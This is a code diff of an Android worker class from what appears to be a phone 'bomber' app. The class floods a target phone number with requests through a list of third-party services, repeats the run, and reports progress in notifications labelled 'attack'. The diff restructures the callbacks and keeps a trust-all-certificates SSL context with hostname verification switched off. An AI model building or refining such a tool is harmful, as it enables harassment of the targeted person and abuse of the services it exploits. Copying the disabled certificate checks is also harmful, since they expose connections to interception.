@@ -100,14 +100,12 @@ public class AttackWorker extends Worker {
     @NonNull
     @Override
     public Result doWork() {
-
         try {
             SSLContext sslContext = SSLContext.getInstance("SSL");
             sslContext.init(null, trustAllCerts, new java.security.SecureRandom());
 
             clientBuilder.sslSocketFactory(sslContext.getSocketFactory(), (X509TrustManager) trustAllCerts[0]);
             clientBuilder.hostnameVerifier((hostname, session) -> true);
-
         } catch (KeyManagementException | NoSuchAlgorithmException e) {
             e.printStackTrace();
         }
@@ -166,45 +164,44 @@ public class AttackWorker extends Worker {
                     break attack;
                 }
 
-                try {
-                    service.prepare(countryCode, phone);
-                    service.run(client, new com.dm.bomber.services.Callback() {
-                        @Override
-                        public void onError(Exception e) {
-                            Log.e(TAG, String.format("%s returned error", service.getClass().getName()), e);
-                            tasks.countDown();
+                service.prepare(countryCode, phone);
+                service.run(client, new com.dm.bomber.services.Callback() {
+                    @Override
+                    public void onError(@NotNull Call call, @NotNull Exception e) {
+                        Log.e(TAG, String.format("%s returned error", service.getClass().getName()), e);
+                        tasks.countDown();
+                    }
+
+                    @Override
+                    public void onResponse(@NotNull Call call, @NotNull Response response) {
+                        if (!response.isSuccessful()) {
+                            Log.i(TAG, String.format("%s returned an error HTTP code: %s",
+                                    response.request().url(), response.code()));
                         }
 
-                        @Override
-                        public void onResponse(@NotNull Call call, @NotNull Response response) {
-                            if (!response.isSuccessful()) {
-                                Log.i(TAG, String.format("%s returned an error HTTP code: %s",
-                                        service.getClass().getName(), response.code()));
-                            }
+                        if (!stopped) {
+                            Notification notification = new NotificationCompat.Builder(getApplicationContext(), CHANNEL_ID)
+                                    .setContentTitle(getApplicationContext().getString(R.string.attack))
+                                    .setContentText("+" + countryCode + phone)
+                                    .setProgress(usableServices.size() * repeats, progress, false)
+                                    .setStyle(new NotificationCompat.BigTextStyle())
+                                    .setOngoing(false)
+                                    .setSmallIcon(R.drawable.logo)
+                                    .build();
 
-                            if (!stopped) {
-                                Notification notification = new NotificationCompat.Builder(getApplicationContext(), CHANNEL_ID)
-                                        .setContentTitle(getApplicationContext().getString(R.string.attack))
-                                        .setContentText("+" + countryCode + phone)
-                                        .setProgress(usableServices.size() * repeats, progress, false)
-                                        .setStyle(new NotificationCompat.BigTextStyle())
-                                        .setSmallIcon(R.drawable.logo)
-                                        .build();
+                            notification.flags |= Notification.FLAG_NO_CLEAR;
 
-                                notificationManager.notify(getId().hashCode(), notification);
+                            notificationManager.notify(getId().hashCode(), notification);
 
-                                setProgressAsync(new Data.Builder()
-                                        .putInt(KEY_PROGRESS, progress++)
-                                        .putInt(KEY_MAX_PROGRESS, usableServices.size() * repeats)
-                                        .build());
-                            }
-
-                            tasks.countDown();
+                            setProgressAsync(new Data.Builder()
+                                    .putInt(KEY_PROGRESS, progress++)
+                                    .putInt(KEY_MAX_PROGRESS, usableServices.size() * repeats)
+                                    .build());
                         }
-                    });
-                } catch (StringIndexOutOfBoundsException e) {
-                    Log.w(TAG, String.format("%s could not process the number", service.getClass().getName()));
-                }
+
+                        tasks.countDown();
+                    }
+                });
 
                 try {
                     Thread.sleep(1000);
